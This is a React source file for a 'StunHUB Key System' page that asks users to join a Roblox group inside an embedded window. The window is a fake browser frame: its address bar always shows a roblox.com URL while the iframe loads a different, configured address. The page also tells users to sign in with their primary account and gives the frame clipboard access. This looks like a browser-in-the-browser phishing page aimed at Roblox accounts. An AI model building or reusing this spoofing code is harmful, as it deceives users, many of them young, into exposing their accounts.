import { useEffect, useRef, useState } from 'react'
import { DEFAULT_EMBED_URL } from './config'
import './App.css'

const DISPLAY_EMBED_URL = 'https://roblox.com/communities/9185732956/'

function ShieldIcon() {
  return (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2.4 20 5v6.2c0 5.2-3.2 9.1-8 10.6-4.8-1.5-8-5.4-8-10.6V5l8-2.6Z" />
      <path className="shield-cut" d="M12 6.5v10.8c2.6-1.2 4.2-3.5 4.2-6.3V7.8L12 6.5Z" />
    </svg>
  )
}

function GroupIcon() {
  return (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <circle cx="9" cy="8" r="3" />
      <circle cx="17" cy="10" r="2.3" />
      <path d="M3.8 19c.4-4 2.3-6 5.2-6s4.8 2 5.2 6M14.4 14.4c.8-.5 1.6-.7 2.6-.7 2.2 0 3.6 1.6 3.9 4.5" />
    </svg>
  )
}

function LockIcon() {
  return (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <rect x="5" y="10" width="14" height="10" rx="2" />
      <path d="M8.5 10V7.5a3.5 3.5 0 0 1 7 0V10" />
    </svg>
  )
}

function EmbedDialog({ open, onClose }) {
  const dialogRef = useRef(null)
  const [frameState, setFrameState] = useState('loading')
  const [hasAcknowledged, setHasAcknowledged] = useState(false)

  useEffect(() => {
    const dialog = dialogRef.current
    if (open && !dialog.open) {
      setHasAcknowledged(false)
      setFrameState('loading')
      dialog.showModal()
    }
    if (!open && dialog.open) dialog.close()
  }, [open])

  useEffect(() => {
    const dialog = dialogRef.current
    const handleCancel = (event) => {
      event.preventDefault()
      onClose()
    }
    dialog.addEventListener('cancel', handleCancel)
    return () => dialog.removeEventListener('cancel', handleCancel)
  }, [onClose])

  return (
    <dialog ref={dialogRef} className="embed-dialog" aria-labelledby="embed-title">
      <div className="browser-shell">
        <header className="browser-chrome">
          <div className="window-dots" aria-hidden="true"><span /><span /><span /></div>
          <div className="address-display" title={DISPLAY_EMBED_URL}>
            <ShieldIcon />
            <span>{DISPLAY_EMBED_URL}</span>
          </div>
          <button className="icon-button" type="button" onClick={onClose} aria-label="Tutup embedded website">
            <span aria-hidden="true">×</span>
          </button>
        </header>

        <div className="embed-notice" id="embed-title">
          <span className="notice-icon" aria-hidden="true">i</span>
          <p><strong>Embedded group page</strong><span>Complete the group task without leaving this window.</span></p>
          <span className="frame-mode">IN FRAME</span>
        </div>

        <div className="frame-stage">
          {!hasAcknowledged && (
            <div className="account-confirmation" role="document" aria-labelledby="account-confirmation-title">
              <span className="confirmation-mark" aria-hidden="true">!</span>
              <div className="confirmation-copy">
                <span className="confirmation-label">Before you continue</span>
                <h2 id="account-confirmation-title">Use your primary Roblox account</h2>
                <p>Alt accounts are not supported for this verification. Make sure you are signed in to your primary account before opening the group page.</p>
              </div>
              <button type="button" className="understand-button" onClick={() => setHasAcknowledged(true)}>I understand</button>
            </div>
          )}
          {hasAcknowledged && frameState === 'loading' && (
            <div className="frame-message" role="status" aria-live="polite">
              <span className="loader" aria-hidden="true" />
              <strong>Opening group page</strong>
              <span>Keeping the destination inside this verification window.</span>
            </div>
          )}
          {frameState === 'error' && (
            <div className="frame-message frame-error" role="alert">
              <strong>Page could not be displayed</strong>
              <span>The destination refused to load inside an iframe.</span>
            </div>
          )}
          {hasAcknowledged && (
            <iframe
              title="Embedded group website"
              src={DEFAULT_EMBED_URL}
              onLoad={() => setFrameState('ready')}
              onError={() => setFrameState('error')}
              sandbox="allow-forms allow-scripts allow-same-origin"
              referrerPolicy="strict-origin-when-cross-origin"
              allow="clipboard-read; clipboard-write"
            />
          )}
        </div>

        <footer className="browser-footer">
          <div className={`frame-status status-${frameState}`} role="status">
            <span className="status-mark" aria-hidden="true" />
            <span>{!hasAcknowledged ? 'Waiting for confirmation...' : frameState === 'ready' ? 'Page loaded successfully.' : frameState === 'error' ? 'Unable to load page.' : 'Viewing group page...'}</span>
          </div>
          <button type="button" className="cancel-button" onClick={onClose}>Cancel</button>
        </footer>
      </div>
    </dialog>
  )
}

function App() {
  const [isEmbedOpen, setIsEmbedOpen] = useState(false)

  return (
    <div className="app-shell">
      <header className="site-header">
        <div className="header-inner">
          <div className="brand">
            <span className="brand-mark"><ShieldIcon /></span>
            <span className="brand-copy">
              <span className="brand-row"><strong>StunHUB</strong><span>KEY SYSTEM</span></span>
              <small>In-app verification gateway</small>
            </span>
          </div>
          <div className="session-label"><span aria-hidden="true" />Single task session</div>
        </div>
      </header>

      <main>
        <section className="verification-card" aria-labelledby="page-title">
          <div className="corner corner-top" aria-hidden="true" />
          <div className="corner corner-bottom" aria-hidden="true" />

          <div className="card-heading">
            <div className="active-label"><span className="active-dot" aria-hidden="true" />Embedded verification active</div>
            <h1 id="page-title">Unlock access.<br /><span>Stay in the flow.</span></h1>
            <p className="intro">Complete the group task inside the embedded window. Your current page stays open from start to finish.</p>
          </div>

          <div className="progress-panel" aria-label="Verification progress">
            <div className="progress-copy"><span>Verification progress</span><strong>0 of 1 complete</strong></div>
            <div className="progress-track" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" role="progressbar"><span /></div>
          </div>

          <div className="task-row">
            <div className="task-identity">
              <span className="task-number">01</span>
              <span className="task-icon"><GroupIcon /></span>
              <span className="task-copy"><strong>Join Roblox Group</strong><small>Opens inside the verification window</small></span>
            </div>
            <button type="button" className="join-button" onClick={() => setIsEmbedOpen(true)}>
              <GroupIcon />
              <span>Open group page</span>
            </button>
          </div>

          <button type="button" className="complete-status" disabled>
            <LockIcon />
            <span><strong>Access key locked</strong><small>Complete the embedded task to continue</small></span>
          </button>
        </section>
      </main>

      <footer className="site-footer">
        <span>StunHUB Key System</span>
        <span>Embedded verification session</span>
      </footer>

      <EmbedDialog open={isEmbedOpen} onClose={() => setIsEmbedOpen(false)} />
    </div>
  )
}

export default App
